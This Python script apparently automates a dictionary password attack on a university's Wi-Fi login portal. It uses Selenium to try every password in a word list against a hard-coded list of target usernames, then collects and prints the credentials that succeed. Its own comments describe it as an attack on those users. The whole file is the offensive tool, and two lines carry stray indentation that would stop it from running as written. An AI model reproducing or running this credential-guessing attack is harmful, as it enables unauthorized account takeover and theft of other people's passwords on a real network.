from wifiModule import WifiModule
from passwordModule import text_to_hash
from selenium import webdriver
from driverFunction import *

# all the user-names on which attacker wants to perform attack.
user_names = ['opt2', 'opt5', 'opt7', 'opt4', 'opt3', 'opt8', 'opt6', 'opt1']

# at the end this will contain all the user-names and their respective passwords.
result = {}


def main():
    check = False

    # program will not execute until user enters correct password.
    # while True:
    #    user_password = input('Enter master password: ')
    #    if text_to_hash(user_password) == '1cf194dec40961db7dbc03b451d9bce3':
    #        break

    # this will get the name of current wifi
     wifi_name = WifiModule.get_wifi_name()

    # if the user is not connected to correct wifi network, Program will close
     if wifi_name != 'LPU Hostels\n' and wifi_name != 'LPU Wireless\n':
        print('Error detected: Please connect to proper network')
        exit()

    # this will create an object of Chrome class.
    driver = webdriver.Chrome()

    # this will open 10.10.0.1 on chrome
    driver.get('http://internet.lpu.in')
    driver.maximize_window()

    with open('dictionary', 'r') as file:

        # this will read the data of dictionary file in string format
        data = file.read()

    # this will split the string and make it a list.
    dict = data.split('\n')

    for uname in user_names:
        for passwd in dict:
            if login_check(driver):
                click_on_logout(driver)

            # stored in driverFunction.py
            middle_stuff(driver, uname, passwd)

            if final_login_check(driver):
                message_print(uname, passwd)
                result[uname] = passwd
                if login_check(driver):
                    click_on_logout(driver)
                check = True
                break
    if check:
        print('Here are all opts and their respective passwords.')
        for i in result.keys():
            print(i, ' -> ', result[i])
        print('-------------------------------')


if __name__ == '__main__':
    main()
